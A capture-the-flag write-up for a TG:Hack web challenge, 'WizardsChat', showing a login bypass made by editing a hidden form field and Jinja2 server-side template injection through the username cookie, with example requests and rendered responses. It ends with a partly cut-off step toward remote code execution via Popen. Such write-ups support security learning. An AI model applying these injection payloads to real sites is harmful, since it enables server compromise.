CHALLENGE INFO

  • CHALLENGE LINK: https://wizardschat.tghack.no/

  • LANDING PAGE: https://wizardschat.tghack.no/login

    • Page Source: 
      <html>
<head>
<title>WizardsChat</title>
<body>
<h1>Login</h1>
<div>
    <strong>Muggles no access! Use your magic to login</strong>
</div>
<form method="POST" action="/login">
<input type="hidden" name="has_magic" value="0" />
Username: <input type="text" name="username" /><br />
<input type="submit" value="Login" />
</form>
</body>
</html>
  • ASSUMED OBJECTIVE: Pass an appropriate username to extract the flag

STEP 1 : Bypass /login page

  • Failed login response: 
    <html>
<head>
<title>WizardsChat</title>
<body>
<h1>NO MAGIC DETECTED</h1>
</body>
</html>
  • Change the value of has_magic from 0 to 1: 
    <input type="hidden" name="has_magic" value="1" />

  • Submit with any username (for now):

    NOTE(S):

    • The chat filters ”<” and ”>” to \< and \> respectively
    • The chat retains {{ }} but does not interpret them.
    • The chat seems to be a rabbit hole.
      • All messages sent by users are output through the chat.
      • The username and message are exposed if it involves a payload.

STEP 2 : Test username input for vulnerabilities

  • Server-side Template Injection (SSTI)
    • Request: 
      GET / HTTP/1.1
Host: wizardschat.tghack.no
...
Cookie: username={&#123; self.__class__ }}
...
    • Rendered Response: 
      ...
    Username: <class 'jinja2.runtime.TemplateReference'>
...

    NOTE:

    • The site is vulnerable to SSTI
    • The templating language used is Jinja2

STEP 3 : Create working payload

  1. Method Resolution Order ( __mro__ )
    • Request: 
      GET / HTTP/1.1
Host: wizardschat.tghack.no
...
Cookie: username={&#123; self.__class__.__mro__ }}
...
    • Rendered Response: 
      ...
    Username: (<class 'jinja2.runtime.TemplateReference'>, <class 'object'>)
...

    Notes:

    • Method Resolution Order returns the order in which base classes are searched
      • This applies for languages that use multiple inheritance
    • __mro__ lets you go back up the tree of inherited objects
    • <class 'jinja2.runtime.TemplateReference'> inherits from <class 'object'>

  4. Attempt RCE (Remote Code Execution)
    • Request: 
      GET / HTTP/1.1

    Notes:

    • The payload works
    • Popen.communicate() returns a tuple (stdout_data, stderr_data)
